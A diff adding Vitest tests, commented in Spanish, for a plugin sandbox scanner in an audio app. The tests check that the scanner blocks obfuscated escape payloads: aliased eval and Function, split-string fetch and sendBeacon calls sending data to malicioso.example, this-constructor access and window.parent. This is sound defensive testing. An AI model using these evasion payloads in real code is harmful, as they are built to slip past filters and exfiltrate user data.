@@ -1,6 +1,6 @@
 // Fix(waveB-ts): noUncheckedIndexedAccess — aserciones non-null (!) en indexaciones
 // garantizadas por el setup de cada test; sin cambios de semántica ni comportamiento.
-import { describe, it, expect, vi, afterEach } from 'vitest';
+import { describe, it, expect, vi, afterEach, beforeEach } from 'vitest';
 import {
   BUILTIN_PLUGINS,
   createReverbImpulse,
@@ -14,6 +14,7 @@ import {
   evaluateCustomPlugin,
   evaluateCustomPluginSandboxed,
   isSandboxAvailable,
+  scanCustomPluginCode,
 } from './pluginSandbox';
 import type { ActiveDSPNode } from './PluginHost';
 import { AudioEngine } from './AudioEngine';
@@ -561,6 +562,127 @@ describe('SEC-01: el sandbox de plugins rechaza la exfiltración (SB1-SB7)', () 
     } finally {
       vi.unstubAllGlobals();
     }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Ronda fix 1 (revisión WP10): el escáner debe rechazar las PALABRAS eval y
+// Function (no solo las llamadas `eval(`/`Function(`) y `this` (acceso al
+// global vía `this['constr'+'uctor']` en ámbito no estricto). Cada payload
+// debe ser RECHAZADO y NO EJECUTADO: la sonda `__sbxProbe` (global stubbed,
+// restaurada en el afterEach) delata cualquier ejecución.
+// ---------------------------------------------------------------------------
+
+const SB_VALID_TAIL = `
+  const customPlugin = {
+    id: 'sb_valid_tail',
+    name: 'Cola válida',
+    category: 'utility',
+    description: 'definición válida tras el payload',
+    parameters: [],
+    createDSPNode: (ctx) => {
+      const g = ctx.createGain();
+      return { inputNode: g, outputNode: g, updateParameter: () => {} };
+    }
+  };
+`;
+
+describe('SEC-01r: el escáner rechaza alias y accesos dinámicos (ronda fix 1)', () => {
+  beforeEach(() => {
+    vi.stubGlobal('__sbxProbe', { touched: [] as string[] });
+  });
+
+  function probeTouched(): string[] {
+    return (globalThis as unknown as { __sbxProbe: { touched: string[] } }).__sbxProbe.touched;
+  }
+
+  it('SB-X1: `const e = eval; e(payload)` se rechaza por la palabra eval', () => {
+    expect(scanCustomPluginCode(`const e = eval;\n${SB_VALID_TAIL}`)).toMatch(/eval/);
+    expect(() =>
+      pluginHost.registerCustomPlugin(`const e = eval;\ne("__sbxProbe.touched.push('X1')");\n${SB_VALID_TAIL}`)
+    ).toThrow(/bloqueado por seguridad/);
+    expect(probeTouched()).toEqual([]);
+  });
+
+  it('SB-X2: `const f = Function; f("...")()` se rechaza por la palabra Function', () => {
+    expect(scanCustomPluginCode(`const f = Function;\n${SB_VALID_TAIL}`)).toMatch(/Function/);
+    expect(() =>
+      pluginHost.registerCustomPlugin(
+        `const f = Function;\nf("__sbxProbe.touched.push('X2'); return 1")();\n${SB_VALID_TAIL}`
+      )
+    ).toThrow(/bloqueado por seguridad/);
+    expect(probeTouched()).toEqual([]);
+  });
+
+  it("SB-X3: `globalThis['fet'+'ch']` se rechaza y fetch no se llama", () => {
+    const calls: string[] = [];
+    vi.stubGlobal('fetch', (...args: unknown[]) => {
+      calls.push(String(args[0]));
+      return Promise.resolve(null);
+    });
+    try {
+      expect(() =>
+        pluginHost.registerCustomPlugin(
+          `globalThis['fet' + 'ch']('https://malicioso.example/fuga');\n${SB_VALID_TAIL}`
+        )
+      ).toThrow(/bloqueado por seguridad/);
+      expect(calls).toEqual([]);
+      expect(probeTouched()).toEqual([]);
+    } finally {
+      vi.unstubAllGlobals();
+      vi.stubGlobal('__sbxProbe', { touched: [] as string[] });
+    }
+  });
+
+  it("SB-X4: `navigator['sendBeac'+'on']` se rechaza y no se llama", () => {
+    const calls: unknown[][] = [];
+    vi.stubGlobal('navigator', {
+      sendBeacon: (...args: unknown[]) => {
+        calls.push(args);
+        return true;
+      },
+    });
+    try {
+      expect(() =>
+        pluginHost.registerCustomPlugin(
+          `navigator['sendBeac' + 'on']('https://malicioso.example/fuga', 'd');\n${SB_VALID_TAIL}`
+        )
+      ).toThrow(/bloqueado por seguridad/);
+      expect(calls).toEqual([]);
+      expect(probeTouched()).toEqual([]);
+    } finally {
+      vi.unstubAllGlobals();
+      vi.stubGlobal('__sbxProbe', { touched: [] as string[] });
+    }
+  });
+
+  it("SB-X5: `location['href']` se rechaza", () => {
+    expect(scanCustomPluginCode(`const u = location['href'];\n${SB_VALID_TAIL}`)).toMatch(/location/);
+    expect(() =>
+      pluginHost.registerCustomPlugin(`const u = location['href'];\n${SB_VALID_TAIL}`)
+    ).toThrow(/bloqueado por seguridad/);
+    expect(probeTouched()).toEqual([]);
+  });
+
+  it("SB-X6: `this['constr'+'uctor']` se rechaza por la palabra this", () => {
+    expect(scanCustomPluginCode(`const c = this['constr' + 'uctor'];\n${SB_VALID_TAIL}`)).toMatch(
+      /this/
+    );
+    expect(() =>
+      pluginHost.registerCustomPlugin(
+        `const c = this['constr' + 'uctor'];\n__sbxProbe.touched.push('X6');\n${SB_VALID_TAIL}`
+      )
+    ).toThrow(/bloqueado por seguridad/);
+    expect(probeTouched()).toEqual([]);
+  });
+
+  it('SB-X7: alcanzar `window.parent` se rechaza y no deja rastro', () => {
+    expect(() =>
+      pluginHost.registerCustomPlugin(
+        `const p = window.parent;\n__sbxProbe.touched.push('X7');\n${SB_VALID_TAIL}`
+      )
+    ).toThrow(/bloqueado por seguridad/);
+    expect(probeTouched()).toEqual([]);
   });
 });
 
